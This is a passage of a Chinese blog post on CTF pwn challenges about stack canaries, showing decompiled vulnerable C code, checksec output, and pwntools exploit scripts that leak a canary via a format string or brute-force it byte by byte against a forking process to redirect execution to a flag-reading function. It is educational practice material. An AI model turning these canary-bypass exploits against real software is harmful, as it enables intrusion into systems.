|<span class="hljs-string">      BBBB       </span>|<br>                                0xc        |<span class="hljs-string">      BBBB       </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">      AAAA       </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------                               <br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#arch也可以是i386~看文件</span><br><br><br>p = process(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;%7$p&#x27;</span>  <span class="hljs-comment"># 可以</span><br><span class="hljs-comment"># payload = &#x27;%7$x&#x27; # 可以</span><br>p.sendline(payload)<br>canary = <span class="hljs-built_in">int</span>(p.recv(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary) <span class="hljs-comment"># p.recv()应该返回一个十六进制字符串，然后通过int()函数将其转换为整数，并将结果存储在canary变量中。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(canary): &quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag) # 可以</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*(0x70-0x0c) + p32(canary) + b&#x27;b&#x27;* 0xc + p32(getflag) # 可以</span><br>payload = cyclic(<span class="hljs-number">0x70</span>-<span class="hljs-number">0x0c</span>) + p32(canary) + cyclic(<span class="hljs-number">0xc</span>) + p32(getflag) <span class="hljs-comment"># 可以</span><br><br>p.send(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">┌──(root㉿kali)-[~/ctf-practice/canary/01]</span><br><span class="hljs-string">└─# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin&#x27;: pid 174011</span><br><span class="hljs-string">/root/ctf-practice/canary/01/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.sendline(payload)</span><br><span class="hljs-string">canary:  4237685760</span><br><span class="hljs-string">hex(canary):  0xfc95f400</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4657#toc-6">canary的各种姿势—-pwn题解版</a>  题目1</p>
+<h1 id="02-针对fork的进程-32位程序"><a href="#02-针对fork的进程-32位程序" class="headerlink" title="02 针对fork的进程 (32位程序)"></a>02 针对fork的进程 (32位程序)</h1><h2 id="checksec分析"><a href="#checksec分析" class="headerlink" title="checksec分析"></a>checksec分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># checksec --file=bin1</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/02/bin1&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># file bin1</span><br>bin1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=29de21cdd9a0496a8057313502c90562b715014b, not stripped<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/02]<br>└─<span class="hljs-comment"># ./bin1</span><br>welcome<br>123456<br>recv sucess<br>welcome<br>qweasdzxc<br>recv sucess<br>welcome<br><br><br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112939.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="分析漏洞函数-1"><a href="#分析漏洞函数-1" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">__pid_t</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v3 = fork();<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>      fun();<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#arch也可以是i386~看文件</span><br><br>p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        txt = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-comment"># print(&quot;txt: &quot;, txt)</span><br>        p.send(txt)<br>        a = p.recvuntil(<span class="hljs-string">&quot;welcome\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;recv&quot;</span> <span class="hljs-keyword">in</span> a:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;type(canary): &quot;</span>, <span class="hljs-built_in">type</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;getflag: &quot;</span>, getflag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p32(getflag): &quot;</span>, p32(getflag))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">12</span> + p32(getflag)<br>p.sendline(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">└─# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin1&#x27;: pid 248869</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="hljs-string">canary:  b&#x27;\x00?&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2a&#x27;</span><br><span class="hljs-string">type(canary):  &lt;class &#x27;bytes&#x27;&gt;</span><br><span class="hljs-string">getflag:  134514235</span><br><span class="hljs-string">p32(getflag):  b&#x27;;\x86\x04\x08&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">recv sucess</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>debug模式下的输出：</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112639.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>当输入<code>00 a6</code>的时候，输出<code>stack smashing detected</code><br>当输入<code>00 a7</code>的时候，输出<code>recv sucess</code></p>
+<p>普通执行输出：</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113121.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>和上一题一样，同一个目录下放了一个flag文件<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113230.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4657#toc-6">canary的各种姿势—-pwn题解版</a>  题目2</p>
+<h1 id="03-64位"><a href="#03-64位" class="headerlink" title="03 (64位)"></a>03 (64位)</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/ctf-practice/canary/03]<br>└─<span class="hljs-comment"># checksec --file=babypie</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/03/babypie&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br><br>┌──(root㉿kali)-[~/ctf-practice/canary/03]<br>└─<span class="hljs-comment"># file babypie</span><br>babypie: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped<br><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="分析漏洞函数-2"><a href="#分析漏洞函数-2" class="headerlink" title="分析漏洞函数"></a>分析漏洞函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  sub_960(a1, a2, a3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_960</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 buf[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  buf[<span class="hljs-number">5</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello %s:\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)buf);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122100.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905122112.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">__int64</span> buf[<span class="hljs-number">6</span>]; <br><span class="hljs-attribute">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br></code></pre></td></tr></table></figure>
+<p>这段代码声明了一个名为 <code>buf</code> 的数组，该数组的元素类型是 <code>__int64</code>，并且数组的大小为6个 <code>__int64</code> 元素。接着，使用 <code>memset</code> 函数将这个数组的前32个字节都设置为0。这通常用于确保数组的初始状态，以避免包含未初始化的数据。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【ctf题目系列】pwn类型 canary</div>
+      <div>http://example.com/2023/09/04/ctf/【ctf题目系列】pwn类型 canary/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ningan123</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/20/tools/%E3%80%90EnterpriseArchitect%E3%80%91%E5%B0%8F%E6%A1%88%E4%BE%8B-%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" title="【EnterpriseArchitect】小案例-图书管理系统">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【EnterpriseArchitect】小案例-图书管理系统</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/01/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="【ctf题目系列】ctfwiki pwn类型 格式化字符串">
+                        <span class="hidden-mobile">【ctf题目系列】ctfwiki pwn类型 格式化字符串</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
